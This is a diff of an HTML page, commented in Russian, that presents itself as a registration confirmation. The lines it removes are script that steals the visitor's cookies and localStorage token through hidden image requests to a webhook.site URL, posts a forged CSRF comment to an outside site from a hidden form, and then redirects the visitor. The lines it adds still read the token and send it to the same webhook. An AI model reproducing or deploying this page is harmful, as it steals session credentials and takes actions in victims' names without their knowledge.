@@ -51,44 +51,20 @@
 
   <div class="confirmation" id="ok">✅ Вы успешно зарегистрированы!</div>
   <iframe name="hiddenFrame"></iframe> 
-  <script>
-  function attack() {
-    // 1. Кража cookie через <img>
-    const img1 = document.createElement("img");
-    img1.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + encodeURIComponent(document.cookie);
-    img1.style.display = "none";
-    document.body.appendChild(img1);
+<script>
+  // Пытаемся получить токен из localStorage
+  const token = localStorage.getItem("token");
 
-    // 2. Кража токена (если есть в localStorage)
-    const token = localStorage.getItem("token");
-    if (token) {
-      const img2 = document.createElement("img");
-      img2.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?token=" + encodeURIComponent(token);
-      img2.style.display = "none";
-      document.body.appendChild(img2);
-    }
-
-    // 3. CSRF через форму (как у тебя)
-    const form = document.createElement("form");
-    form.action = "https://kazcyber.zapto.org/comments.php";
-    form.method = "POST";
-    form.target = "hiddenFrame";
-
-    const input = document.createElement("input");
-    input.type = "hidden";
-    input.name = "comment";
-    input.value = "💀 CSRF-комментарий от имени жертвы 💀";
-
-    form.appendChild(input);
-    document.body.appendChild(form);
-    form.submit();
-
-    // 4. Уведомление и редирект
-    document.getElementById("ok").style.display = "block";
-    setTimeout(() => {
-      window.location.href = "https://cyberwebinar.kz/thanks";
-    }, 3000);
+  // Если токен найден, отправляем его на webhook.site
+  if (token) {
+    const img = new Image();
+    img.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?token=" + encodeURIComponent(token);
+  } else {
+    // Отправим пустой запрос, чтобы проверить, что скрипт сработал вообще
+    const ping = new Image();
+    ping.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?token=null";
   }
 </script>
+
 </body>
 </html>
